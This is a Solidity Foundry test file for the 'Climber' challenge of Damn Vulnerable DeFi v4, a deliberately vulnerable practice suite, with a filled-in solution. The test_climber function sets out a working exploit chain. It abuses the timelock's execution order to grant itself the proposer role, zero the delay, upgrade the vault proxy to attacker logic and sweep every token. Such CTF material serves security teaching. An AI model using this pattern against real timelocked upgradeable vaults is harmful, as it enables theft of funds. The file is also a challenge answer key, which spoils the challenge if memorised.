// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

import {BuggyVault} from "../../src/attacker-contracts/climber/BuggyVault.sol";

import {AttackTimelock} from "../../src/attacker-contracts/climber/AttackTimelock.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        bytes32 salt = keccak256("attack proposal");
        bytes memory emptyBytes;

        // Deploy our attacking contract
        AttackTimelock attackContract =
            new AttackTimelock(address(vault), payable(address(timelock)), address(token), player);

        // Deploy contract that will act as new logic contract for vault
        BuggyVault buggyVault = new BuggyVault();

        // Set proposal rule to the timelock contract
        bytes memory grantRoleData =
            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, attackContract);

        // Update delay to 0
        bytes memory updateDelayData = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // Call to the vault to upgrade to attacker controlled contract logic
        bytes memory upgradeData =
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(buggyVault), emptyBytes);

        // Call Attacking Contract to schedule these actions and sweep funds
        bytes memory exploitData = abi.encodeWithSignature("exploit()");

        address[] memory targets = new address[](4);
        uint256[] memory emptyData = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        // grant propersal role to climbertimelock
        targets[0] = address(timelock);
        dataElements[0] = grantRoleData;

        // set the delay to 0
        targets[1] = address(timelock);
        dataElements[1] = updateDelayData;

        // upgrade vault to buggy vault
        targets[2] = address(vault);
        dataElements[2] = upgradeData;

        // create the proposal
        targets[3] = address(attackContract);
        dataElements[3] = exploitData;

        // Set our 4 calls to attacking contract
        attackContract.setScheduleData(targets, dataElements);

        vm.warp(block.timestamp + 1);
        // execute the 4 calls
        timelock.execute(targets, emptyData, dataElements, salt);

        // Withdraw our funds from attacking contract
        attackContract.withdraw(recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
